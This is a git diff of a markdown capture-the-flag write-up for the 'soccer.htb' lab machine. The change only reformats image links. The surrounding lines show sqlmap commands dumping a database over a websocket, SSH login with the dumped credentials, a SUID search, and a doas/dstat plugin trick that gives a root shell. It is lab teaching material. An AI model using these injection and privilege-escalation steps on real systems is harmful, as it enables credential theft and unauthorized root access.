@@ -32,19 +32,19 @@ sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads
 level 5 --risk 3 --batch
 ```
 
-![[db_Sqli.png]]
+![db_sqli](db_Sqli.png)
 
 ```
 sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D
 soccer_db --dump --batch
 ```
 
-![[cred_sqli.png]]
+![cred_sqli](cred_sqli.png)
 
 ## User Flag
 
 we use the found credentials to ssh into our machine successfully
-![[user_flag.png]]
+![user_flag](user_flag.png)
 
 ## Privilege Escalation
 
@@ -53,11 +53,11 @@ We check if we can use any **SUID** bins as root using the following command
 find / -type f -perm -4000 2>/dev/null
 ```
 
-![[bins.png]]
+![bins](bins.png)
 searching for doas we find that the config file is in  ```/usr/local/etc/doas.conf``` 
 revealing that we can run dstat as root
 
-![[dstat.png]]
+![dstat](dstat.png)
 
 the dstat man page reveals that we can use it to run external python plugins as root
 
@@ -70,4 +70,4 @@ when we execute this command we create a python script that executes a shell we 
 doas /usr/bin/dstat --list
 ```
 to get a shell as root
-![[root.png]]
+![root](root.png)
